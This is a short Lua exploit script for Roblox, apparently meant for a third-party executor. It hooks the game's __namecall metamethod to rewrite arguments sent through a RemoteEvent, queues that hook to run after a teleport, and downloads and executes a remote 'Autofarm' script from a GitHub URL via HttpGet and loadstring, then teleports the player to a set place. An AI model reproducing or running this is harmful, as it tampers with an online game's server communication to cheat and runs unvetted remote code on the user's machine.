queue_on_teleport([[
    local mt = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)

    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}

        if method == "FireServer" and self.Name == "RemoteEvent" then
            args[1] = buffer.fromstring("\1")
        
            return old(self, unpack(args))
        end

        return old(self, ...)
    end)
    loadstring(game:HttpGet("https://github.com/EzkieMalia/helloautofarm/edit/main/Autofarm.lua"))()
]])

game:GetService("TeleportService"):Teleport(10179538382, game.Players.LocalPlayer)
